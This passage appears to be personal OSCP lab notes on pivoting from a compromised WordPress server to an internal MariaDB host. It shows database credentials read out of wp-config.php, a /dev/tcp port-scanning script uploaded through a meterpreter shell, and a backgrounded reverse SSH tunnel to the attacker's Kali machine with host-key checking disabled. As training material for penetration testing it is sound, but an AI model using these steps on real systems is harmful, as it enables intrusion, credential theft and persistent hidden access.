-rw-r--r-- 1 www-data www-data 2.9K Jan 7 2019 wp-config-sample.php
-rw-r--r-- 1 www-data www-data 2.7K Dec 6 18:07 wp-config.php
drwxrwsr-x 6 www-data www-data 4.0K Dec 9 19:04 wp-content
...
cat wp-config.php
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** MySQL database username */
define( 'DB_USER', 'wp' );
/** MySQL database password */
define( 'DB_PASSWORD', 'Lv9EVQq86cfi8ioWsqFUQyU' );
/** MySQL hostname */
define( 'DB_HOST', '10.5.5.11' );
```

   - **wp_config.php file**, we find that the database** IP address is set to 10.5.5.11**.
   
   -   We also discovered a **MariaDB username of “wp”** and that the password for this account is**“Lv9EVQq86cfi8ioWsqFUQy"**.
   
   # Summary
- access database through local port forwarding through ssh tunnel
- create  ssh tunnel in the back ground
- scan opening ports in the target machine
- upload portscan.sh through meterpreter shell
- open ssh tunnel without prompting for passwords
prevent user from x11 forwarding  strict action to take from misleading

-----------------------------------------
-----------------------------------------
-    We have a shell on the WordPress box as the **www-data user and we also have network access to the database via Ajla.**

-    we just **discovered database credentials** that we **know are valid since they are already in use by theWordPress application.**

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/24_2/37.jpg)

-    WordPress machine and the database box are on separate networks, this is a great time to use a tunnel.

-    our reverse shell is running in the context of an unprivileged user account without a valid login shell (www-data).
-    ssh (the client) is a core application that is included in almost every Linux distribution, we can attempt to use it to create a reverse tunnel.

-    One caveat is that since **we do not have root access to create a login for the www-data user**, 
-    we **will need to use the SSH client on the WordPress machine to log in to our Kali server** ** to create the tunnels. **

-    In short, we’ll need a reverse tunnel.

-    A dynamic port forward would not be useful to us since the tunnel would be going the wrong way.

-   **A local port forward would not be useful either for the same reason.**

-    **A remote port forward would allow us to open up a port in Kali that would point to the MariaDB server.**

-    However this requires us to know which ports are actually open on the internal target.

-    we will check for Nmap to see if the port scan can be made easier, but we shouldn’t get our hopes up.

```bash
nmap  
/bin/sh: 1: nmap: not found
```

-    Nmap is not on the server, but no need to worry. 
-    We can create a quick script to scan the host.

```bash
#!/bin/bash  
host=10.5.5.11  
for port in {1..65535}; do  
 timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&  
 echo "port $port is open"  
done  
echo "Done"
```

-    The contents of the script can be saved in a file named portscan.sh. Our script will iterate each **portfrom 1 to 65535**.

-    For each port, a connection will be made with a **timeout of .1 seconds and if the connection succeeds, the script will echo which port is open.**

-    To run the script, we will need to dump the contents to a file. A quick way to do this is to use the meterpreter upload command.

```bash
meterpreter > upload /home/kali/portscan.sh /tmp/portscan.sh
[*] uploading : /home/kali/portscan.sh -> /tmp/portscan.sh
[*] Uploaded -1.00 B of 151.00 B (-0.66%): /home/kali/portscan.sh -> /tmp/portscan.sh
[*] uploaded : /home/kali/portscan.sh -> /tmp/portscan.sh
meterpreter > shell
Process 2924 created.
Channel 2 created.
cd /tmp
chmod +x portscan.sh
./portscan.sh
port 22 is open
port 3306 is open
done
```

-    we see that port 22 and 3306 are open.

-    we will need to create a tunnel to allow Kali to have access to ports 22 and 3306 on the database server

-    The ssh command to accomplish this will look similar to the following:

```bash
ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 kali@10.11.0.4
```

-    open up port 1122 on Kali to point to port 22 on the MariaDB host.

-    we will also open 13306 on Kali to point to 3306 on the MariaDB host.

-    If we were to run this command in a meterpreter shell, we would quickly run into a hurdle since we don’t have a fully interactive shell.

-    This is a problem since ssh will prompt us to accept the host key of the Kali machine and enter in the password for our Kali user.

-    For security reasons, we want to avoid entering in our Kali password on a host we just compromised.

-    We can fix the first issue by **passing in two optional flags to automatically accept the host key of our Kali machine**.
-    These are **UserKnownHostsFile=/dev/null** and **StrictHostKeyChecking=no**

-    The first option prevents ssh from attempting to save the host key by sending the output to **/dev/null**
-    **The second option will instruct ssh to not prompt us to accept the host key**

-    Both of these options can be set via the **-o flag**

```bash
ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o  
"StrictHostKeyChecking=no" kali@10.11.0.4
```

-    we need to prevent ssh from asking us for a password, which we can do by using ssh keys

-    **We will generate ssh keys on the WordPress host**, **configure Kali to accept a login from the newly generated key** (and only allow port forwarding), and modify the ssh command one more time to match our changes

```bash
mkdir keys
cd keys
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/keys/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /tmp/keys/id_rsa.
Your public key has been saved in /tmp/keys/id_rsa.pub.
...
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMf
LhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8Z
Io/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T
5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF
9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla
```

-    This new public key needs to be entered in our Kali host’s** authorized_keys file for the kali user, but with some restrictions**

-    To** avoid potential security issues** we can **tighten the ssh configuration only permitting access coming from the WordPress IP address** (note that this will be the NAT IP since this is what Kali will see and not the IP of the actual WordPress host).

-    Next, we want to ignore any commands the user supplies

- This can be done with the** command option in ssh**.  
  
- We also want to prevent agent and X11 forwarding with the no-agent-forwarding and no-X11-forwarding options.  
  
- Finally, we want to prevent the user from being allocated a tty device with the no-tty option.  
  
- The final **~/.ssh/authorized_keys** file on Kali can be found in Listing 897.

```bash
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",
no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA
AABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ
9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7k
Z1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9x
k87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MD
nin www-data@ajla
```

-    This entry allows the owner of the private key (the web server), to log in to our Kali machine but prevents them from running commands and only allows for port forwarding.

-    we need to add a couple more options to our ssh command to ensure that it will work.

-    we need to add the **-N flag to specify that we are not running any commands**

-    We also need the** -f option to request ssh to go to the background**. Finally, we also need to provide the key file that we are using via -i.

```bash
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul
l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
```

-    we need to run the SSH command in the meterpreter shell

```bash
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul
l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
Could not create directory '/var/www/.ssh'.
Warning: Permanently added '10.11.0.4' (ECDSA) to the list of known hosts
```

-    Now let’s verify that the ports are open on our Kali machine:

```bash
kali@kali:~$ sudo netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1/systemd
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 645/sshd
tcp 0 0 127.0.0.1:13306 0.0.0.0:* LISTEN 91364/sshd: kali
tcp 0 0 127.0.0.1:1122 0.0.0.0:* LISTEN 91364/sshd: kali
tcp6 0 0 :::111 :::* LISTEN 1/systemd
tcp6 0 0 :::22 :::* LISTEN 645/sshd
tcp6 0 0 ::1:13306 :::* LISTEN 91364/sshd: kali
tcp6 0 0 ::1:1122 :::* LISTEN 91364/sshd: kali
... 
```

-    since the **ssh command was run in the background,** even if our meterpreter shell were to die,** we would have remote access to the database server through the remote tunnel.**
